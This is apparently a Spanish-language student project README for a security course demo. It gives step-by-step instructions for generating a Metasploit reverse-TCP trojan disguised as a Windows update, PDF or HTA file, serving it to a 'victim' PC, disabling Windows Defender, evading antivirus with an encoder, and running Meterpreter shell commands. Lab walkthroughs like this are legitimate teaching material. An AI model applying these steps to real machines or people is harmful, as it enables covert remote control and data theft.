# Proyecto: Creación y Ataque de Troyano 🔴

**Curso:** Seguridad de Aplicaciones — Sesión 10 y 11  
**Instituto:** IDEX "Carlos Salazar Romero"  
**Integrantes:** Luna Cossio Brenda · Lopez Quezada Lisman · Guerra Acosta Cristian

---

## Para la expo — solo sigan esto

### Antes de empezar (una sola vez)

Abren una terminal en Kali y corren esto:

```bash
pip install pexpect
```

Eso es todo lo que se instala.

---

### El día de la expo

#### En la PC atacante (Kali Linux)

**Paso 1** — Descargar el proyecto

```bash
git clone https://github.com/davestinhast/proyecto-troyano-expo
cd proyecto-troyano-expo
```

**Paso 2** — Correr el script

```bash
python3 generador.py
```

El script pregunta cómo quieres que se vea el archivo:

```
¿Cómo quieres que se vea el archivo para la víctima?

  [1]  Ejecutable normal           →  Actualizacion_Windows.exe
  [2]  Disfrazado de PDF           →  Informe_Academico.pdf.exe
  [3]  Archivo HTA (página web)    →  Documento_Revision.hta
```

Eliges una opción y él hace todo solo:
- Detecta la IP de Kali automáticamente
- Genera el archivo trampa en el formato que elegiste
- Abre Metasploit en otra ventana para escuchar la conexión
- Levanta un servidor para que la víctima descargue el archivo

Al final muestra una dirección como esta:

```
http://192.168.X.X:8000
```

Esa dirección se la das a la víctima.

---

### ¿Cuál formato conviene usar?

| Opción | Cómo lo ve la víctima | Cuándo usarlo |
|---|---|---|
| `.exe` normal | `Actualizacion_Windows.exe` | Para demostración directa |
| `.pdf.exe` | `Informe_Academico.pdf` (Windows oculta el `.exe`) | Para mostrar ingeniería social |
| `.hta` | `Documento_Revision.hta` — parece una página web | Para mostrar que no tiene que ser un .exe |

---

#### En la PC víctima (Windows)

**Paso 1** — Abrir el navegador y entrar a la dirección que mostró el script

**Paso 2** — Hacer clic en `Actualizacion_Windows.exe` y descargarlo

**Paso 3** — Ejecutar el archivo descargado

> ⚠️ Si Windows Defender lo bloquea antes de ejecutarlo, desactívalo así:
> Inicio → Seguridad de Windows → Protección contra virus → Desactivar protección en tiempo real

---

#### De vuelta en Kali — obtener la información

Cuando la víctima ejecuta el archivo, en la ventana de Metasploit aparece solo:

```
meterpreter >
```

Ahí escriben estos comandos uno por uno:

```
sysinfo
```
Muestra el nombre del equipo, versión de Windows, arquitectura.

```
getuid
```
Muestra el nombre del usuario actual de la víctima.

```
shell
```
Entra al CMD de la víctima. Ahí escriben:

```
whoami /user
```
Muestra el SID del usuario.

```
dir
```
Lista los archivos y carpetas del directorio actual de la víctima.

Para salir del CMD y volver a Meterpreter:
```
exit
```

---

## ¿Qué es cada cosa? (para la explicación al profe)

### Malware

Programa que hace daño en una computadora de forma intencional y sin que el usuario lo sepa. Los atacantes lo usan para robar datos, pedir dinero o tomar control de sistemas.

### Troyano

Tipo de malware que se disfraza de programa normal. La víctima lo descarga y ejecuta sin saber que es malicioso. Una vez ejecutado, el atacante tiene acceso completo al sistema.

### msfvenom

Herramienta de Kali Linux que genera el payload, es decir, el código malicioso que va dentro del archivo trampa. Acepta la IP del atacante y el puerto para saber a dónde conectarse cuando la víctima lo ejecute.

### Reverse TCP

La víctima se conecta hacia la máquina atacante, no al revés. Esto sirve para saltarse firewalls, porque la conexión sale desde adentro de la red de la víctima.

### Meterpreter

La consola de control que te da Metasploit una vez que la víctima ejecuta el archivo. Desde ahí puedes ver archivos, obtener información del sistema y moverse por la máquina víctima sin que ella lo note.

### LHOST y LPORT

- **LHOST** = la IP de la máquina atacante (donde se va a recibir la conexión)
- **LPORT** = el puerto donde se escucha la conexión (usamos el 4444)

---

## ¿Por qué el archivo no lo detecta el antivirus?

El script usa un encoder llamado `shikata_ga_nai` que ofusca el código del payload, es decir, lo mezcla y codifica para que el antivirus no reconozca la firma. Aun así, versiones modernas de Windows Defender pueden detectarlo, por eso se desactiva en la víctima para la práctica.

---

## Flujo completo resumido

```
PC Kali                              PC Víctima (Windows)
───────────────────────────────────────────────────────
python3 generador.py
  → detecta IP
  → genera Actualizacion_Windows.exe
  → abre Metasploit (escuchando)
  → levanta servidor HTTP
                                     Abre navegador
                                     Entra a http://IP:8000
                                     Descarga el .exe
                                     Lo ejecuta
Meterpreter session abierta ←───────────────────────────
sysinfo / getuid / shell
whoami /user / dir
```
